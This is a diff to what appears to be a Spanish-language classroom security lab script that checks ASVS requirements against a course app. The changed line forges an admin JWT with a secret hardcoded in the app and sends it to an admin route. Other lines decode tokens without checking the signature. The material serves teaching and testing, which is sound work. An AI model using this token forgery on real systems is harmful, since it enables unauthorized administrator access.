@@ -39,7 +39,7 @@ run "curl -s -X POST $B/registro -H '$J' -d '{\"nombre\":\"Intruso\",\"documento
 paso "Fila 7 y 17 · El secreto del JWT esta en el codigo (ASVS 9.1.2, 13.3.1) [T3 del Lab 1]"
 run "grep -n 'SECRET_KEY' app/auth.py"
 echo '## Token forjado con ese secreto, con rol admin, aceptado por una ruta de administrador'
-run "python3 -c \"import jwt; print(jwt.encode({'sub':'999','rol':'admin'},'presta-ucp-2026',algorithm='HS256'))\" > /tmp/tok.txt; curl -s -o /dev/null -w 'POST /equipos con token forjado -> HTTP %{http_code}\n' -X POST $B/equipos -H '$J' -H \"Authorization: Bearer \$(cat /tmp/tok.txt)\" -d '{\"nombre\":\"x\",\"tipo\":\"y\"}'"
+run "python3 -c \"import jwt; print(jwt.encode({'sub':'999','rol':'admin','exp':4102444800},'presta-ucp-2026',algorithm='HS256'))\" > /tmp/tok.txt; curl -s -o /dev/null -w 'POST /equipos con token forjado -> HTTP %{http_code}\n' -X POST $B/equipos -H '$J' -H \"Authorization: Bearer \$(cat /tmp/tok.txt)\" -d '{\"nombre\":\"x\",\"tipo\":\"y\"}'"
 
 paso "Fila 8 · El token no tiene expiracion (ASVS 9.2.1) [T3 del Lab 1]"
 run "python3 -c \"import jwt; t='$(token ana@presta.edu.co ana12345)'; print(sorted(jwt.decode(t,options={'verify_signature':False}).keys()))\""
